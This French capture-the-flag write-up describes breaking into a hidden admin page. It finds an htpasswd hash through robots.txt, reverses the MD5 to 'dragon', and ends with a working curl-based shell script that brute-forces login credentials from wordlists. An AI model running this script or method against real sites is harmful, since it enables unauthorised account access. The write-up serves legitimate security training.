# Explications
Dans la page "http://IP/admin/", qui est une page cachée, il y un formulaire de connexion :

```html
<form action="#" method="POST"> 
	Username: <input type="text" name ="username" style="width:100%;"recquired="" >
	Password:<input type="password" name ="password" style="width:100%;" AUTOCOMPLETE="off" recquired="" >
	&nbsp;	<p align="center"><input type="submit" value="Login" name ="Login"></p>
</form>
```
On observe aussi la présence d'un robots.txt sur le site comprenant :
<pre>User-agent: *
Disallow: /whatever
Disallow: /.hidden</pre>

<pre>Le fichier robots.txt, à placer la racine d'un site web, contient une liste de ressources du site qui ne sont pas censées être explorées par les moteurs de recherches.

Par convention, les robots consultent le fichier robots.txt avant d'explorer puis d'indexer un site Web. Lorsqu'un robot tente d'accéder à une page web, comme par exemple http://www.mon-domaine.fr/page.html, il tente d'accéder en premier lieu au fichier robots.txt situé à l'adresse http://www.mon-domaine.fr/robots.txt</pre>

En allant sur la page <code>/whatever</code>, on trouve un htpasswd, ou il y a marqué:

<pre>root:8621ffdbc5698829397d97767ac13db3</pre>

On en deduit donc qu'il sagit d'un login et d'un mot de passe (Pour la page "admin"). 

Une fois encore il s'agit de MD5 pour le mot de passe, donc on reverse et on trouve :

<pre><code>dragon</code></pre>

En tapant dans le page "admin", <code>root</code> et <code>dragon</code>, on trouve le flag.

# Comment l'éviter ?
Il faut proteger la page en question avec un .htaccess.

# Bonus
Le mot de passe et le user de cette page sont aussi trouvable en **Brute Force** avec un script shell un peu different du premier:
```bash
#!/bin/sh
url="http://$1/admin/"
curl -s -X POST "$url" -d "username=qsdqsdq&password=qsdqsd&Login=Login" > trueone
while IFS='' read -r user; do
	echo "try user : $user"
	while IFS='' read -r line; do
		echo "\ttry password: $line"
		curl -s "$url" -d "username=$user&password=$line&Login=Login"> tested
		DIFF=$(diff trueone tested)
		if [ "$DIFF" != "" ]
		then
			cat tested | grep "flag"
			echo "user is : $user\npassword is $line" >> result.txt
			rm tested
			break
		fi
		rm tested
	done < "dict.txt"
done < "users.txt"
```